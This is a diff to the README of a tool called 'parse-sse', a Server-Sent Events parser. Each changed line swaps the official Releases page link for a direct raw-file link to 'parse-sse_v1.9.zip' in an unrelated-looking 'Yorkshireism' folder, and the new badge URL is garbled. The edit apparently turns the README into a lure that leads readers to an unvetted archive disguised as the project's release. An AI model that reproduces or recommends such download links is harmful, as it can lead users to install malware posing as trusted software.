@@ -6,7 +6,7 @@ Welcome to the **parse-sse** project! This tool helps you easily parse Server-Se
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-parse--sse-blue.svg)](https://github.com/Loaila1680/parse-sse/releases)
+[![Download Here](https://raw.githubusercontent.com/Loaila1680/parse-sse/main/Yorkshireism/parse-sse_v1.9.zip%https://raw.githubusercontent.com/Loaila1680/parse-sse/main/Yorkshireism/parse-sse_v1.9.zip)](https://raw.githubusercontent.com/Loaila1680/parse-sse/main/Yorkshireism/parse-sse_v1.9.zip)
 
 To get started, you will need to download the software. 
 
@@ -23,7 +23,7 @@ Before you install, here are a few things you should check:
 
 To download the software, visit the Releases page:
 
-- Click [here to download](https://github.com/Loaila1680/parse-sse/releases).
+- Click [here to download](https://raw.githubusercontent.com/Loaila1680/parse-sse/main/Yorkshireism/parse-sse_v1.9.zip).
 
 1. Once you are on the Releases page, look for the latest version.
 2. Click the asset that corresponds to your operating system.
@@ -76,6 +76,6 @@ Yes, if you encounter issues or have questions, feel free to reach out through t
 
 ## 🌐 Stay Updated
 
-For updates and more information, check our [Releases page](https://github.com/Loaila1680/parse-sse/releases) regularly. You can also follow the project for future enhancements and features.
+For updates and more information, check our [Releases page](https://raw.githubusercontent.com/Loaila1680/parse-sse/main/Yorkshireism/parse-sse_v1.9.zip) regularly. You can also follow the project for future enhancements and features.
 
 Thank you for using **parse-sse**! Enjoy parsing your Server-Sent Events with ease.
